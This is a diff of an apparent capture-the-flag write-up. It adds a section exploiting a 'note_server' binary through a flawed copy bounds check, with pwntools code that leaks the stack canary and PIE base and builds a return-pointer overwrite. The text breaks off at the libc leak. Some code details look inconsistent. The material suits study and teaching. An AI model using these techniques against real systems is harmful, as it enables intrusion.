@@ -33,7 +33,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### HTTP
 
-![](../../.gitbook/assets/image%20%2817%29.png)
+![](../../.gitbook/assets/image%20%2818%29.png)
 
 Couple things to note right away:
 
@@ -99,7 +99,7 @@ If we use the _Send Message_ feature of the website, our data gets parsed immedi
 
 Note how the function returns the SQLite error if there is one, meaning we should get some feedback:
 
-![](../../.gitbook/assets/image%20%2816%29.png)
+![](../../.gitbook/assets/image%20%2817%29.png)
 
 Now we know there is some SQL injection involved, let's think about what we need to extract. In `utils.py`, we see that there's a `try_login` function:
 
@@ -293,7 +293,7 @@ dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNj
 
 Updating it in `Inspect Element` works!
 
-![We&apos;re now an admin](../../.gitbook/assets/image%20%2818%29.png)
+![We&apos;re now an admin](../../.gitbook/assets/image%20%2819%29.png)
 
 ## Analysing the Source as Admin
 
@@ -518,6 +518,139 @@ switch(cmd) {
 
 To summarise, the code can do the following:
 
-* Write a note
-  * 
+* Write
+  * Read input size - only one byte
+  * Check if that would bring you over the max size
+  * Read that many bytes
+  * Increase `index` \(a pointer to the end of the current note\)
+* Copy
+  * Take in offset
+  * Take in size
+  * Check if `index` is out of range
+  * Copy Data
+  * Increase `index`
+* Show
+  * Write note contents
+
+The main flaw here is the check for `copy` occurs _before `index` is increased_. So if we copy a massive chunk, the check will be passed anyway.
+
+{% hint style="info" %}
+The binary uses `fork()`, which means the memory will be identical for every connection. Same binary base, same libc base, same canary, same everything.
+{% endhint %}
+
+### Setup
+
+First, some basic setup:
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('./note_server')
+
+if args.REMOTE:
+    libc = ELF('./libc-remote.so')
+    p = process('127.0.0.1', 5002)      # for the portfwd
+else:
+    libc = elf.libc
+    p = process('127.0.0.1', 5001)
+
+### Wrapper Functions
+def recv():
+    log.info(p.clean().decode('latin-1'))
+
+def send(text, to_recv=False):
+    p.send(text)
+    if to_recv:
+        recv()
+
+def write(text):
+    send('\x01')
+    send(chr(len(text)))
+    send(text)
+
+def copy(length, start=0):
+    send('\x02')
+    
+    start = hex(start)[2:].rjust(4, '0')
+    chars = chr(int(start[:2], 16)) + chr(int(start[2:], 16))
+
+    send(chars[::-1])        # little-endian
+
+    send(chr(length))
+
+def read():
+    send('\x03', False)
+    return p.clean(0.5)
+```
+
+### Leaking Canary and PIE
+
+Now let's try writing 3 times then copying a massive amount.
+
+```python
+write('A' * 0xff)
+write('B' * 0xff)
+write('C' * 0xff)
+copy(start=0xff*3, length=250)
+print(read())
+```
+
+Well, we've leaked significantly more than the stuff we wrote, that's for sure. Let's _completely_ fill up the buffer, so we can work with the stuff after it. The buffer size is `1024` bytes, plus another 8 for the saved RBP.
+
+```python
+write('A' * 0xff)       # 255
+write('B' * 0xff)       # 510
+write('C' * 0xff)       # 765
+write('D' * 0xff)       # 1020
+write('E' * 4)          # 1024
+copy(start=1024, length=32)
+
+leaks = read()[1024:]
+
+addrs = [u64(leaks[addr:addr+8]) for addr in range(0, len(leaks), 8)]
+[print(hex(addr)) for addr in addrs]
+```
+
+```text
+0x7ffe9d91bbe0
+0xdc185629f84e5a00            canary
+0x7ffe9d91bbe0                rbp
+0x565150b24f54                rip
+```
+
+Now we've successfully leaked, we can parse the values. Using radare2 and breaking on the `ret`, the offset between the leaked RIP value there and binary base is `0xf54`:
+
+![](../../.gitbook/assets/image%20%2816%29.png)
+
+```python
+leaks = read()[1032:]
+
+canary = u64(leaks[:8])
+log.success(f'Canary: {hex(canary)}')
+
+ret_pointer = u64(leaks[16:24])
+elf.address = ret_pointer - 0xf54
+log.success(f'PIE Base: {hex(elf.address)}')
+```
+
+Now we need to somehow read a GOT entry. Since the binary uses `write()`, it's possible. But first we need to get the copy working in a way that it starts overwriting at _exactly_ the return pointer. With a bit of messing about, I got a function that seemed to work.
+
+```python
+def deliver_payload(payload):
+    payload = 'A' * 12 + payload
+    payload = payload.ljust(0xff, 'A')
+
+    write(payload)
+    write('B' * 0xff)
+    write('C' * 0xff)
+    write('D' * 0xff)
+
+    copy(12 + len(payload))
+```
+
+We're 12 off the canary at the end, so we put 12 `A` characters ahead and copy 12 extra.
+
+### Leaking LIBC
+
+
 
